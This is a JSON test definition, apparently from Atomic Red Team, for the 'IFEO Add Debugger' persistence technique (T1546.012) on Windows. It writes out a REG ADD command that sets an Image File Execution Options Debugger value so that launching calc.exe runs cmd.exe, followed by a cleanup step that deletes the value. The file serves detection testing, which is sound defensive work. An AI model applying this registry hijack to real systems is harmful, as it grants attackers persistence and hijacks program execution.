{
  "id": "fdda2626-5234-4c90-b163-60849a24c0b8",
  "name": "IFEO Add Debugger",
  "description": "Leverage Global Flags Settings\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "c26c800a-e701-4dd2-941f-17c0304dee7d",
      "type": "execute-command",
      "data": {
        "command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v Debugger /d \"#{payload_binary}\"\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "55f3f31e-f4d2-419b-840a-8c7687dd6023",
      "type": "execute-command",
      "data": {
        "command": "reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v Debugger /f \u003enul 2\u003e\u00261\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "c26c800a-e701-4dd2-941f-17c0304dee7d",
      "p": "on-success",
      "o": "55f3f31e-f4d2-419b-840a-8c7687dd6023"
    },
    {
      "s": "c26c800a-e701-4dd2-941f-17c0304dee7d",
      "p": "on-failure",
      "o": "55f3f31e-f4d2-419b-840a-8c7687dd6023"
    }
  ],
  "tags": [
    "T1546.012",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "payload_binary",
      "type": "path",
      "description": "Binary To Execute",
      "value": "C:\\Windows\\System32\\cmd.exe"
    },
    {
      "name": "target_binary",
      "type": "path",
      "description": "Binary To Attach To",
      "value": "calc.exe"
    }
  ]
}